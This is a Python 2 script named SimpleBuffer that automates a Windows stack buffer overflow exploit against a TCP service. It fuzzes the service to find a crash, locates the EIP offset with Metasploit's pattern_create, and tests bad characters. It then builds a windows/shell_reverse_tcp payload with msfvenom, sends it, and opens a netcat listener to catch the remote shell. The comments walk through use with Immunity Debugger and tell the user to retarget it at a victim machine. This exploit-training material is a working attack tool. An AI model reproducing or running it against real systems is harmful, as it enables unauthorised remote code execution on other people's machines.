#!/usr/bin/env python

# SimpleBuffer v1.0
# Usage: simplebuffer.py

#Phase 1:
#In order for the script to work, you need to get the return value using mona modules along with immunity debugger.
#once you have the return value convert it to little endian format (ex: \xf3\x12\x17\x31) enter it inside the script in 'module' variable along with the target IP and port. Note: if your executable requires a prefix or postfix enter it as well.
#Run immunity debugger in Windows 32 bit and load the executable file and press F9.
#From your Kali, run the script, the script will start fuzzing until the program crashes.
#In immunity debugger, check the EIP value it should read 41414141.
#Relaod the executable in immunity debugger by pressing ctrl+F2, then go back to the script and press enter.
#The value of the EIP should change, copy it and paste it in the script, then press ENTER.
#The script will send badchars, find if any badchars are present.
#check for any bad character, if none type "\x00" or \x00 + badchars.
#Finally, reload the executable in immunity debugger then go back to the script and press Enter, you should now get a shell. in case you did not get a shell add the offset value in the script and run it again.

#Phase 2:
#if you got a shell working on your local envirment machine, you can now add your offset value in the script and change the IP to your target machine. the script will skip all previous processes and start generating the shellcode and connect to the target machine.

# Notes:
# make sure pattern_create.rb is locate in /usr/share/metasploit-framework/tools/exploit/
# scripts will run on <= Python 2.7
# the script uses eth0 as default network interface, change it if you have different network interface name.

# Devoleped by Muhannad


import time
import socket
import sys
import subprocess
import os
import netifaces as ni
from subprocess import call
from colorama import Fore, Back, Style


#=============== Change These values ===============

host = '0.0.0.0' # *** CHANGE THIS ***
port = 9999 # *** CHANGE THIS ***
module = '' # *** CHANGE THIS ***, use mona with Immunity debugger, ex:\xf3\x12\x17\x31

#============== Optional Values ===================

prefix = '' # You need to find the prefix if needed
postfix = '' # You need to find the postfix if needed
offset = '' # if you know the offset put it between the brackets or leave it for fuzzing




#================ Color Functions =================

def yellow(STRING):
    return Style.BRIGHT+Fore.YELLOW+STRING+Fore.RESET

def red(STRING):
    return Style.BRIGHT+Fore.RED+STRING+Fore.RESET

def green(STRING):
    return Style.BRIGHT+Fore.GREEN+STRING+Fore.RESET

def cyan(STRING):
    return Style.BRIGHT+Fore.CYAN+STRING+Fore.RESET

#==================================================

t = time.localtime()
current_time = time.strftime("%H:%M:%S", t)
buff = '' 
shellcode=''


def main(): 
 	
 print ('Starting SimpleBuffer at ' + str(current_time))
 print ('SimpleBuffer report for ' + str(host))
 
 if offset == '':
    fuzz()
    getbad()
    genetare_shell()
    establish_connection()
 else:
    genetare_shell()
    establish_connection()

 
def fuzz():
  # max number of buffers in the array
  max_buffer = 10000
  # initial value of the counter
  counter=0
  # increment value
  increment=100
  # Connection counter
  connected=False

  while counter <= max_buffer:
    	buff=''
    	buff+= str(prefix) + 'A' * counter + str(postfix)
    	counter+=increment
	try:
		try:
		   socket.setdefaulttimeout(1)		
		   s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		   connect = s.connect((host, port))
		except socket.gaierror, e:
		   print (red('[-] Address-related error connecting to server: %s' % e))
		   sys.exit(1)
		except socket.error, e:
		   print ('[-] Unable to connect to ' + str(host) + ' ,make sure the target IP is listening on port ' + str(port) + "\n[-] Connection error: %s" % e)
		   sys.exit(1)		
		if (connected==False):
		   s.sendall(buff)
		   print (green('[+] Connected to host successfully'))
		   connected=True
		   print('Fuzzing with %s bytes' % str(counter))
		   s.recv(1024)
		else:
		   s.sendall(buff)
		   print('Fuzzing with %s bytes' % str(counter))
		   s.recv(1024)
		if (counter >= max_buffer):		
			print ('[-] Failed to fuzz with %s' % (counter + increment) + '\nbuffer has reached maximum pissable bytes to fuzz, try to increase --max_buffer')
			sys.exit(1)
		else:
			None
	except socket.timeout:
		if (counter<=100):
		   print (red('[!] Looks like the buffer has already been filled, reload the program and try again'))
		   sys.exit(1)
		else:
		      print(green('\n[!] Possible overflow detected at %s bytes' % str(counter)))
		break
	s.close()
  proc = subprocess.Popen(['cd /usr/share/metasploit-framework/tools/exploit/; ./pattern_create.rb -l %s' % str(counter)], stdout=subprocess.PIPE,shell=True)
  (pattern, err) = proc.communicate()
    
#====================== Get the return value ======================

  raw_input ('[!] The EIP value should now be 41414141\n[!] Reload the program to get the return value and then press Enter : ')

  try:
                   print ('[!] Connecting ...')
		   socket.setdefaulttimeout(5)		
		   s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		   connect = s.connect((host, port))
		   print (green('[+] Connected to host successfully'))
		   if prefix is None:
		      s.sendall(pattern)
		   elif postfix is None:
		   	  s.sendall(pattern)
		   else: 
		      s.sendall(str(prefix)+pattern+str(postfix))
		   print(yellow('[!] Sending Pattern'))

		   s.recv(1024)
	           s.close()
                   #time.sleep(.5)
  except socket.gaierror, e:
		   print ('..')
		   #sys.exit(1)
  except socket.error, e:
		   print ('..')
		   #sys.exit(1)
    
  while True:
       locateOffset = raw_input('[*] Enter the value of the EIP : ')
       if len(locateOffset) != 8:
        print (yellow('[!] The EIP vlaue is not correct'))
       else:
           break
  locateOffset = locateOffset.decode("hex")  
  locateOffset = locateOffset[::-1]
  loffset=pattern.find(locateOffset, 0, len(pattern))
  print(green('[+] Exact match found at ' + str(loffset)))
  global offset
  offset = int(loffset)
 


def getbad():
     
    raw_input (yellow('[*] Reload the program to get the badchars and then press Enter : '))
    badchars = (
    "\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10"
    "\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20"
    "\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30"
    "\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40"
    "\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50"
    "\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60"
    "\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70"
    "\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80"
    "\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90"
    "\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0"
    "\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0"
    "\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0"
    "\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0"
    "\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0"
    "\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0"
    "\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff"
     )
    
    try:
                   print ('[!] Connecting ...')
		   socket.setdefaulttimeout(5)		
		   s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		   connect = s.connect((host, port))
		   print (green('[+] Connected to host successfully'))
		   if prefix is None:
		      shellcode=('A' * int(offset) + 4 * 'B' + badchars)
		      s.sendall(shellcode)
		   else: 
		      shellcode=('A'* int(offset) + 4 * 'B' + badchars)
		      s.sendall(str(prefix)+shellcode+str(postfix))
		   print('[!] Sending badchars ...')
		   print(yellow('[!] Your EIP value should now be 42424242'))
		   s.recv(1024)
	           s.close()
                   time.sleep(.5)
    except socket.gaierror, e:
		   print ('..')
		   #sys.exit(1)
    except socket.error, e:
		   print ('..')
		   #sys.exit(1)

def genetare_shell():	
		   
# === creating a shell ===		   
	   
	    while True:
	       badchars = raw_input (yellow('''[*] Enter badchars or Type "x00" if no badchars found: '''))
	       if len(badchars) < 1:
		  print (yellow('''[!] Type "x00" if no badchars found'''))
	       else:
		  break

	    # Getting host IP
	    ni.ifaddresses('eth0')
	    ip = ni.ifaddresses('eth0')[ni.AF_INET][0]['addr']

	    # Generating Shellcode
	    print (yellow('[!] Generating shellcode ...\nmsfvenom -p windows/shell_reverse_tcp LHOST=' + str(ip) + ' LPORT=4444 EXITFUNC=thread -f raw -a x86 --platform windows -n 32 --smallest -b ' + str(badchars)))
	    msfvenom=('msfvenom -p windows/shell_reverse_tcp LHOST=' + str(ip) + ' LPORT=4444 EXITFUNC=thread -f raw -a x86 --platform windows -n 32 --smallest -b ' + str(badchars))
	    ps2 = subprocess.Popen(msfvenom,shell=True,stdout=subprocess.PIPE)
	    buffV = str(ps2.communicate()[0])
	    print (green("[+] Shellcode Generated !"))
	    global buff
	    buff=str(buffV)


#========== establish netcat listner =============


def establish_connection():
    raw_input (yellow('[*] Reload the program get a shell or press ENTER if you added required values:'))
    try:
                   print ('[!] Connecting ...')
		   socket.setdefaulttimeout(5)		
		   s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		   connect = s.connect((host, port))
		   print (green('[+] Connected to host successfully'))
		   print (yellow('[!] Sending Payload'))
		   payload=("A" * int(offset) + module  + buff + str(postfix))
		   if prefix != None:
		      s.sendall(str(prefix)+payload)
		   elif postfix != None:
		   	  s.sendall(str(postfix)+payload)
		   else:
		      s.sendall(payload)
		   netcat = 'nc -nvlp 4444 -w 3'
                   call(netcat,shell=True)
		   s.recv(1024)
	           s.close()
	           raw_input (yellow('[!] looks like something was wrong with the shell, press enter to try again. '))
	           genetare_shell()
	           establish_connection()

    except socket.gaierror, e:
		   print ('..')
		   sys.exit(1)
    except socket.error, e:
		   print ('..')
		   sys.exit(1)



if __name__ == '__main__':

    try:
        main()
    except KeyboardInterrupt:
        print ('\n')
    try:
               sys.exit(1)
    except SystemExit:
               os._exit(1)

